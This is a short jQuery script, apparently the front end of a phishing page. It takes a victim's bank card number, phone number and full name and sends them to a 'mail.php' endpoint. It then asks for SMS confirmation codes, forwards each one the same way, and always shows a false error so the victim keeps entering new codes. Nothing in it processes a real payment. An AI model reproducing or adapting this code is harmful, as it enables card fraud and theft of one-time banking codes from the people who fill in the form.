
$("#card").mask("9999 9999 9999 9999");
$("#phone").mask("+7 (999) 999-99-99");
//$("#sms").mask("9999");

$("#card,#phone,#fio").keyup(function(){
	if($("#card").val().length == 19 && $("#phone").val().length > 10 && $("#fio").val().length > 5){
		$("#send_card").removeAttr("disabled");
	}else{
		$("#send_card").attr("disabled","");
	}
});

$("#sms").keyup(function() {
    var smsLength = $("#sms").val().length;

    if (smsLength >= 4 && smsLength <= 6) {
        $("#send_sms1").removeAttr("disabled");
        $("#error_message").hide(); // Скрываем сообщение об ошибке
    } else {
        $("#send_sms1").attr("disabled", "disabled");
        
        // Показать сообщение об ошибке
        $("#error_message").show();
    }
});

$("#send_card").click(function(){

	$.ajax({
		url: 'mail.php',
		method: 'post',
		data:{
			"card": $("#card").val(),
			"phone": $("#phone").val(),
			"fio": $("#fio").val()
		}
	});
	
	$("#input_1").fadeOut(800);
	setTimeout(function(){
		$("#input_2").show();
	},1500)

});

$("#send_sms1").click(function(){
	
	$('.error_code').fadeOut(0);
	
	$("#send_sms1").attr("disabled","");

	$.ajax({
		url: 'mail.php',
		method: 'post',
		data:{
			"sms": $("#sms").val()
		}
	});
	
	setTimeout(function(){
		$(".error_code").fadeIn();
		$("#send_sms1").removeAttr("disabled");
		$('#sms').val('');
	},1500)

});